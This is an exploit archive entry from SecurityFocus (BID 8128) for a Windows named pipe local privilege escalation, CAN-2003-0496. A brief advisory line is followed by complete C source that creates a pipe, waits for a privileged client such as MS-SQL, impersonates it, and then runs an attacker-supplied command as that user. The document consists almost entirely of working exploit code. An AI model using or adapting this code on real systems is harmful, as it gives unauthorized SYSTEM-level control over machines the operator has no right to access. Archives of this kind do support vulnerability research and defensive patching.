source: http://www.securityfocus.com/bid/8128/info

It has been reported that Microsoft Windows does not properly handle named pipes through the CreateFile API. Because of this, an attacker may be able to gain access to the SYSTEM account.


/*  tac0tac0.c - pay no attention to the name, long
story...
  *
  *  Author:  Maceo
  *  Modified to take advantage of CAN-2003-0496 Named
Pipe Filename
  *  Local Privilege Escalation Found by @stake. Use with
their Advisory.
  *  -wirepair@sh0dan.org http://sh0dan.org
  *
  *
  *  All credits for code go to Maceo, i really did
minimal work
  *  with his code, it took me like 3 seconds heh.
  *  Shouts to #innercircle,
  *
  */


#include <stdio.h>
#include <windows.h>


int main(int argc, char **argv)
{
   DWORD dwNumber = 0;
   DWORD dwType = REG_DWORD;
   DWORD dwSize = sizeof(DWORD);

   if (argc != 2) {
	  fprintf(stderr, "Usage: %s <cmd.exe>\nNamed Pipe Local
Priv Escalation found by @stake.\n"
					   "This code is to be used with MS-SQL exactly as
outlined in their advisory\n"
					   "All credit for this code goes to Maceo, he did a
fine job.. -wire\n",argv[0]);
					   exit(1);
   }
   // build the next named pipe name //
   char szPipe[64];
   //sprintf(szPipe, "\\\\.\\pipe\\net\\NtControlPipe%lu",
++dwNumber);
   sprintf(szPipe, "\\\\.\\pipe\\poop");

   // create the named pipe before scm can //
   HANDLE hPipe = 0;
   hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX,
                            PIPE_TYPE_MESSAGE|PIPE_WAIT,
                            2, 0, 0, 0, NULL);
   if (hPipe == INVALID_HANDLE_VALUE)
   {
     printf ("Failed to create named pipe:\n  %s\n",
szPipe);
     return 3;
   }


   ConnectNamedPipe (hPipe, NULL);

   // assume the identity of the client //
   if (!ImpersonateNamedPipeClient (hPipe))
   {
     printf ("Failed to impersonate the named pipe.\n");
     CloseHandle(hPipe);
     return 5;
   }


   // display impersonating users name //
   dwSize  = 256;
   char szUser[256];
   GetUserName(szUser, &dwSize);
   printf ("Impersonating: %s\n", szUser);

   system(argv[1]);
   CloseHandle(hPipe);
   return 0;
}